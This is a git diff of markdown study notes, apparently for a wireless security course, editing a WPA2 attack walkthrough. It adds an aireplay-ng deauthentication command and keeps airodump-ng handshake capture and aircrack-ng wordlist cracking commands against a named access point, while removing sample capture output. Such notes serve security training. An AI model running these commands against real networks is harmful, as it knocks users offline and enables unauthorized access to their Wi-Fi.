@@ -97,21 +97,15 @@ CH  6 ][ Elapsed: 18 s ][ 2020-03-16 20:58
  14:59:C0:XX:XX:XX  -16        5        0    0   4  195  WPA2 CCMP   PSK  NETGEAR73
  16:59:C0:XX:XX:XX  -16        5        0    0   4  195  WPA2 CCMP   PSK  NETGEAR-Guest
 ```
-Deauthentication to get handshake   
+Deauthentication to Capture handshake   
 
 <a href="https://youtu.be/DqjOqEwq8uE" title="Deauth attack"><img src="https://github.com/vipertooth/Notes/blob/master/SEC617/images/Death-screenshot.png"/></a>
 
 
-Capture Handshake   
+`aireplay-ng --deauth 5 -e NETGEAR-Guest wlan0mon`     
 `airodump-ng -c 4 -d 16:59:C0:XX:XX:XX -w savefile wlan0mon`   
 
-```bash
- CH  4 ][ Elapsed: 18 s ][ 2020-03-16 21:08 ][ WPA handshake: 16:59:C0:95:DB:06
 
- BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
-
- 16:59:C0:XX:XX:XX  -19  48       88        5    0   4  195  WPA2 CCMP   PSK  NETGEAR-Guest
-```
 
 Crack WPA2   
 `aircrack-ng -w /usr/share/wordlists/rockyou.txt savefile.cap`   
